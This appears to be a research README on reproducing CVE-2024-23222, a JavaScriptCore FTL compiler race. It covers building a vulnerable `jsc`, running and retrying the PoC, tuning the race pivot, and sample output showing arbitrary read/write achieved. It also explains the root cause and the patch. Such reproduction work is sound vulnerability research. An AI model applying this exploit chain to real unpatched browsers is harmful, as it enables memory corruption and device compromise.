# Reproducing CVE-2024-23222 in the `jsc` Shell

This guide gets you a vulnerable JavaScriptCore binary on your desk, runs the
extracted Coruna trigger against it, and shows `addrof`/`fakeobj` landing.
No iPhone required.

## What we now know about the bug

The Stage 1 writeup described CVE-2024-23222 as a JIT type confusion. That's
the *consequence*. The *root cause* is more interesting:

**It's a TOCTOU race between two FTL compiler passes, against a main-thread
structure transition.**

`Graph::tryGetConstantProperty()` runs on the compiler thread and reads
`target.p1` directly out of the live heap, validating the read by checking
`target->structure()` against a known-good set. That validation is **sound
for a single call**. The bug is that two passes call it in sequence:

1. **CFA** calls it, succeeds, and publishes the narrow type
   `{trainingArray, ArrayWithDouble}` into the cross-block dataflow lattice
   (`block->ssa->valuesAtHead`).
2. The main thread executes `delete target.p2` — flips `target`'s structure
   pointer, so future `tryGetConstantProperty` calls fail their validation.
3. **ConstantFolding** calls it, correctly fails — but then reads the
   *stale* `valuesAtHead` that CFA published in step 1. It sees the narrow
   type, decides the `CheckArray` guard is redundant, and calls
   `node->remove(m_graph)` (`DFGConstantFoldingPhase.cpp:317`).
4. CFA runs again, recomputes the correct ⊤ type — but `node->remove()` is
   irreversible. The fixpoint converges on a graph with no guard.

The window between steps 1 and 3 is ~1700 mach ticks on Apple Silicon. The
exploit's `delete r.p2` at warmup iteration 131,072 is calibrated to land
inside it on iPhone hardware.

(There's a 2014 comment block above `tryGetConstantProperty` that worries
about a *different* failure mode — store reordering of a property write vs. a
structure transition, [bug 134641](https://bugs.webkit.org/show_bug.cgi?id=134641).
Same vicinity, wrong bug. The cassowary trigger doesn't reorder any stores;
`delete r.p2` is a single write, and the race is about *which compiler pass*
observes it.)

Full mechanism with the t₀–t₄ timeline and ARM64 disasm: see
[Threading the Timeline](../Stage1-writeup.md#threading-the-timeline) in the
Stage 1 writeup.

## Target commit

| | |
|---|---|
| **Vulnerable tag** | `WebKit-7617.1.17.13.7` |
| **Commit hash** | `cbe051a9a3765825ccb92c790ec0e50c66c6bc51` |
| **Date** | November 17, 2023 |
| **Patch commit (main)** | `31601205b6f323ddec602a3cce0f29174d2d8efa` (Jan 5, 2024) |
| **Patch backport** | `safari-7617.2.4.11-branch` (iOS 17.3 release line) |

Any tag in the `WebKit-7617.1.17.*` family is vulnerable; all of them
predate January 2024. We're using `.13.7` because it's the tag matching the
JavaScriptCore that shipped in iOS 17.2.1, cassowary's newest target.

**Verifying you're at a vulnerable commit:** the patch added two new files.
If `Source/JavaScriptCore/dfg/DFGDesiredObjectProperties.cpp` exists in your
checkout, you're patched. If it doesn't, you're vulnerable.

## Build

### macOS

```bash
brew install cmake ninja

git clone --filter=blob:none https://github.com/WebKit/WebKit.git jsc-vuln/WebKit
cd jsc-vuln/WebKit
git checkout WebKit-7617.1.17.13.7

Tools/Scripts/build-jsc --release
cd ../..
```

The PoC scripts (`retry-race.sh`, `run-minibrowser-poc.sh`, `build-webkit-browser.sh`)
look for the checkout at `jsc-vuln/WebKit` relative to the repo root, so clone
it there.

The `--filter=blob:none` flag clones full history but lazy-fetches file
contents. ~640MB instead of ~10GB. You need full history because the tag
isn't reachable from `main` and a shallow clone won't see it.

`build-jsc` without `--jsc-only` on macOS uses Xcode's build system. Output
lands in `WebKitBuild/Release/jsc`. **Build Release, not Debug**: the PoC's
`PIVOT` constant is calibrated against the Release build's FTL pipeline
timings. A Debug `jsc` reaches CFA tens of thousands of iterations later
and the baked-in pivot will miss.

### Linux (ARM64 strongly preferred)

```bash
# Debian/Ubuntu
sudo apt install cmake ninja-build ruby libicu-dev

git clone --filter=blob:none https://github.com/WebKit/WebKit.git jsc-vuln/WebKit
cd jsc-vuln/WebKit
git checkout WebKit-7617.1.17.13.7

Tools/Scripts/build-jsc --jsc-only --release \
    --cmakeargs="-DENABLE_STATIC_JSC=ON"
cd ../..
```

Output lands in `WebKitBuild/JSCOnly/Release/bin/jsc`. The `--jsc-only` flag
selects the JSCOnly port, which skips WebCore/WebKit and builds just the JS
engine. ~20 minutes on a modern laptop.

`-DENABLE_STATIC_JSC=ON` statically links libJavaScriptCore into the `jsc`
binary so you don't have to fight `LD_LIBRARY_PATH`.

**Memory.** A release build with `-O2` on the unified sources peaks well
over 1GB per `cc1plus` process. The default is `-j$(nproc)`. On an 8GB box
that's an OOM kill waiting to happen. Either pass `--makeargs=-j2`, or
let it crash once and resume with:

```bash
ninja -C WebKitBuild/Release -j2 jsc
```

ninja is incremental, so the resume only rebuilds the two or three objects
the OOM killer interrupted.

## Run

The repo's vulnerable build lives at `jsc-vuln/WebKit/WebKitBuild/Release/jsc`
(macOS Xcode build; on JSCOnly it's `.../Release/bin/jsc`). If you built your
own, substitute your path.

A fresh `build-jsc` produces a binary whose load command points at
`/System/Library/Frameworks/JavaScriptCore.framework`, the patched system
copy. Rewrite it to look next to itself:

```bash
install_name_tool -change \
  /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore \
  @executable_path/JavaScriptCore.framework/Versions/A/JavaScriptCore \
  jsc-vuln/WebKit/WebKitBuild/Release/jsc
codesign -f -s - jsc-vuln/WebKit/WebKitBuild/Release/jsc
```

One time, after the build. After this `jsc` is self-contained: no
`DYLD_FRAMEWORK_PATH`, and it survives being launched through SIP-protected
parents like `/bin/bash` or `lldb`.

```bash
jsc-vuln/WebKit/WebKitBuild/Release/jsc poc/cve-2024-23222-rw.js
```

No arguments needed; defaults are baked in (WARMUP=250000, PIVOT=178000,
GC_FLUSH=1048576). One run is well under a second. Reliability swings with
system load: ~89% on an idle machine, lower under contention, since the
race window is on the order of the OS scheduler's wake-up jitter. The
retry harness papers over it.

`trigger()` carries 47 padding loops per side (cassowary's original had 36).
More CFG nodes between CFA's tgcp call and CFold's stretches the gap to
roughly 1900–2110 mach ticks (mean ≈ 2058 over instrumented runs); against
the OS scheduler jitter on the compiler thread's wake-up that's wide enough
to flatten the hit rate.

**Do not pass `--useConcurrentJIT=false`.** Concurrent JIT is the bug surface.
With it off, `tryGetConstantProperty` runs on the main thread, there's no
CFA→ConstantFolding gap, the trigger does nothing.

The race is one shot per process, so a miss means relaunching. Loop until
first hit (`poc/retry-race.sh` does the same thing with nicer logging):

```bash
n=0; while ! $JSC poc/cve-2024-23222-rw.js 2>&1 | grep -q "read64 OK"; do
  n=$((n+1)); done; echo "hit on attempt $((n+1))"
```

### What the chain does

`cve-2024-23222-rw.js` runs the race for addrof/fakeobj, then continues into
arbitrary read/write, mirroring cassowary's `pm.wo()` (Stage1 lines 665-827):
spray 32-byte cells so the phantom's "butterfly" lands on a real object
header, sniff a StructureID from the live heap, point one object's butterfly
at another object's butterfly slot, and you have a steerable pointer.

addrof and fakeobj always fire together: the same stale `valuesAtHead[D@569]`
removes both `CheckArray` nodes (read-side D@614 and write-side D@621).
147/147 coupling over 200 instrumented runs.

### Expected output (hit), trimmed

```
═══ addrof ═══
  reconstructed addr:    0x133504160
  ground truth:          0x133504160
  ✓ MATCH — addrof works

[*] === stage2: building read64/write64 ===
[*] heap groom: spraying 32-byte cells...
[*] training phantomRW (1M iterations -> FTL)...
[*] training readGadget/writeGadget (2M iterations -> FTL)...

=== heap layout ===
  overlapObj:     0x1335061c0
  adjacentObj:    0x1335061e0  (delta 32)
  [+] adjacency verified: overlapObj+32 = adjacentObj

=== butterfly corruption ===
  rwArray:        0x133c98170
  adjacentObj's butterfly -> rwArray+8 = 0x133c98178
  adjacentObj[0] now aliases rwArray's butterfly pointer field

=== self-test: read64 ===
  read64(0x133444240) = 0x10018060000b0b0
    StructureID:  0xb0b0  (expected 0xb0b0)
    IndexingType: 0x6  (expected 0x06 NonArrayWithDouble)
  [+] read64 OK

=== self-test: write64 ===
  writing 0x4142434445464800 to scratch[0] @ 0x7023cfc170
  read64 readback:   0x4142434445464800
  scratch[0] (JS):   0x4142434445464800  <- independent verification
  [+] write64 OK

[+] ALL TESTS PASSED. Arbitrary read/write achieved.
```

The TGCP ring at the end shows 16 events on a hit (vs. 4 on a miss). Events
[2] and [3] are the bug: CFA's tgcp returns `OK` (`result=0x1110864e8`,
`trainingArray`'s address), CFold's returns `STRUCT-MISS` (`result=0x0`).
That `OK` → `STRUCT-MISS` sequence **is** the bug. The remaining 12 events
are the FTL pipeline iterating to fixpoint with the un-folded `GetByOffset`
still in the graph; they're a side effect, not the mechanism.

### Tuning for your hardware

`STRUCTURE_PIVOT` is the iteration at which `delete target.p2` fires. It
needs to land between CFA's tgcp call and ConstantFolding's tgcp call on the
compiler thread. The window is fixed in **compiler-thread time**; the aim
point is in **main-thread time** (warmup iterations); the conversion between
them is hardware-dependent. The in-the-wild iPhone constant was 131,072.

If your hit rate is low, sweep:

```bash
JSC=jsc-vuln/WebKit/WebKitBuild/Release/jsc
for p in $(seq 165000 3000 195000); do
  hits=0; for i in {1..10}; do
    $JSC poc/cve-2024-23222-rw.js -- 250000 $p 1048576 2>&1 | grep -q "read64 OK" && hits=$((hits+1))
  done; printf "PIVOT=%-7d  %2d/10\n" $p $hits
done
```

On M-series the plateau runs roughly 173K–186K (M3 Max, idle; the upper edge
shifts down under load). Below the plateau, the
delete fires too early (both passes see the post-delete structure;
`CheckArray` survives). Above it, the delete fires too late (both passes see
the pre-delete structure; `GetByOffset` folds to a constant and the trigger
short-circuits). Pick the center.

PIVOT is also sensitive to **file size**: the FTL tier-up fires when the JIT
thread has chewed through enough work, and that includes parse time and DFG
compile time, which scale with bytecode size. The smaller stage-1-only PoC
(`-tuned.js`) tier-ups tens of thousands of iterations earlier than `-rw.js`
because there's no stage2 IIFE to parse, so it needs a lower pivot. If you
fork either file and add or remove a few hundred lines, re-sweep.

### Capturing the disassembly

To see the missing `CheckArray` for yourself:

```bash
# Find the compile signature first
JSC_reportFTLCompileTimes=true $JSC poc/cve-2024-23222-tuned.js 2>&1 | grep trigger
#  → trigger#DdQKmo or similar

# Race-won compile (uses TGCP_REPLAY to make it deterministic — see dfg-race-widen.patch)
TGCP_REPLAY_FIRST_FTL=1 JSC_dumpFTLDisassembly=true JSC_ftlAllowlist=trigger \
  $JSC poc/cve-2024-23222-graphdump.js 250000 131072 100000 \
  2>&1 | tee ftl-disasm-buggy.log | grep -c CheckArray
#  → 0

# Race-lost compile
JSC_dumpFTLDisassembly=true JSC_ftlAllowlist=trigger \
  $JSC poc/cve-2024-23222-graphdump.js 250000 50000 100000 \
  2>&1 | tee ftl-disasm-safe.log | grep -c CheckArray
#  → 2  (D@614 read-side, D@621 write-side)
```

In the safe log you'll find `ldurb w2,[x1,#4]; and w0,w2,#0xf; cmp w0,#7; b.ne` —
the IndexingType check that catches `trapArray` (IndexingType=9, `ArrayWithContiguous`). In the buggy
log those four instructions are absent and `ldur Q0,[x0,#8]` reads pointer bits
straight into a SIMD register.

Pre-captured: `ftl-disasm-safe.log`, `ftl-disasm-buggy.log`.

## Why the iPhone constants don't work as-is

An earlier draft of this file said the bug was unreproducible on a desktop
`jsc` and pinned it on ARM64 store reordering. **That theory was wrong.**
`delete r.p2` is one store — there's nothing to reorder. The actual reason
the iPhone constants give ~1% on a MacBook is dumber:

The race window is fixed in **compiler-thread time** (~1700 ticks between
CFA's tgcp call and ConstantFolding's tgcp call). The aim point is in
**main-thread time** (warmup loop iterations). On an M-series MacBook the
main thread runs faster relative to the compiler thread than on an iPhone
A-series core, so iteration 131,072 arrives ~2000 ticks *before* the
compiler thread reaches CFA. The delete fires into empty air; both passes
see the post-delete structure; CheckArray survives.

Bumping the pivot up lets the main thread spin longer before firing so the
delete lands centered in the window. That's the entire fix. No
memory-ordering exotica required.

## Files

| File | What it is |
|---|---|
| `cve-2024-23222-rw.js` | **Full chain.** addrof → fakeobj → phantom → heap groom → butterfly corruption → read64/write64. 47 padding loops/side widen the CFA→CFold gap to ~1900–2110 ticks (mean ≈ 2058); ~89% on an idle M-series machine with PIVOT=178000, load-dependent. Self-tests by reading a JSCell header and round-tripping a write. |
| `cve-2024-23222-tuned.js` | Stage 1 only (addrof/fakeobj). 36 loops, narrower window. Smaller and faster (~14ms/shot), useful when iterating on the trigger; needs a lower PIVOT than `-rw.js` because tier-up fires earlier. |
| `cve-2024-23222-addrof-fakeobj.js` | Original cassowary extraction with iPhone constants. ~1% on a MacBook; kept for reference. |
| `cve-2024-23222-instrumented.js` | The tuned PoC plus a ring-buffer dump of compiler-thread tgcp calls. Use this to see the `[CFA OK] → [CFold STRUCT-MISS]` sequence. |
| `cve-2024-23222-graphdump.js` | Adds an `isFinalTier()` spin loop so the FTL install survives `JSC_dumpFTLDisassembly`'s 100× compile-time slowdown. Use for capturing disasm. |
| `cve-2024-23222-tgcp-reach.js` | Minimal — only proves `tryGetConstantProperty` is reachable with `set.size > 1`. Useful for verifying your build is vulnerable before chasing timing. |
| `dfg-race-widen.patch` | Instruments `tryGetConstantProperty` with a `mach_absolute_time()` ring buffer + optional `TGCP_REPLAY_FIRST_FTL=1` for deterministic repro. ~25 lines. Apply with `git apply` against the vulnerable checkout. |
| `ftl-disasm-safe.log` | FTL disassembly when the race is lost. Two `CheckArray` nodes; `ldurb w2,[x1,#4]` IndexingType check at offset `<188>`. |
| `ftl-disasm-buggy.log` | FTL disassembly when the race is won. `grep CheckArray` returns nothing. The `ldur Q0,[x0,#8]` at offset `<204>` is the addrof; the `stur d0,[x0,#8]` at `<264>` is the fakeobj. |

## What the patch does

`31601205b6f3` introduces a `DesiredObjectProperties` queue. When
`tryGetConstantProperty` reads a value on the compiler thread, instead of
returning it directly for folding, it records `(object, offset, value,
structure)` in this queue. At the end of compilation, **on the main thread**,
`Plan::isStillValidOnMainThread()` walks the queue and verifies each
recorded value still matches what the object actually holds. If anything
changed, the compilation is discarded.

The follow-up `66f60deae73` ("Remove DFGDesiredObjectProperties", landed on
`main` 2024-01-25; the safari-7618 branch carries the same change as
`a8b53bc4d7b3`) simplified the implementation. The whole fix was two commits totaling ~180 lines.
